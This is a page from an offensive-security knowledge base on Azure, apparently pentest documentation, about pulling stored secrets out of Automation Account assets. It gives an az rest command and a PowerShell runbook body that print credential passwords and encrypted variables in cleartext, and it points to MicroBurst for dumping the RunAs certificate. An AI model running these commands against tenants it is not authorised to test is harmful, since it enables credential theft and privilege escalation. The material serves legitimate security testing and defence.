---
title: "Automation assets: reading cleartext Automation Account secrets"
order: 5
description: "Reading Automation Account credential, variable, and connection assets, often stored in cleartext, for stored secrets."
keywords:
  - Automation Account
  - credential asset
  - variable
  - connection
  - cleartext secret
---

# Automation assets

Azure Automation Accounts store reusable **assets**: credential objects (username and password), variables (often marked encrypted but readable from inside a runbook), and connections (service-principal details for the RunAs account). These are a dense pool of standing secrets, and a principal that can read or run runbooks extracts them.

## Reading assets from the management plane

```bash
az automation account list -o table
# variables (non-encrypted values return directly)
az rest --method get --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Automation/automationAccounts/<aa>/variables?api-version=2023-11-01"
```

## Extracting encrypted assets through a runbook

Encrypted variables and credential assets are not returned by the API, but a runbook running inside the Automation Account can read them in cleartext and print them:

```powershell
# publish and start a runbook with this body; it runs with the account's access
$cred = Get-AutomationPSCredential -Name '<credAsset>'
"$($cred.UserName):$($cred.GetNetworkCredential().Password)"
Get-AutomationVariable -Name '<encryptedVar>'
```

## Exploitation notes

- MicroBurst's `Get-AzPasswords` automates this: it publishes a temporary runbook that dumps every credential, variable, and connection asset and the RunAs certificate.
- The RunAs **connection** asset yields a service-principal certificate, a durable credential for that principal (see [Serverless > Automation Accounts](../serverless/automation-accounts/index.md)).
- Writing and running a runbook also executes code as the Automation Account's managed identity, which ties this to [privilege escalation](../identity/privilege-escalation/index.md).

## Tools

- **MicroBurst** (`Get-AzPasswords`): dumps all Automation assets and the RunAs cert.
- **az cli** / **az rest**: read non-encrypted variables directly.

## References

- [NetSPI: MicroBurst and Automation Account secrets](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud: Azure Automation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: Automation assets](https://learn.microsoft.com/azure/automation/shared-resources/credentials)
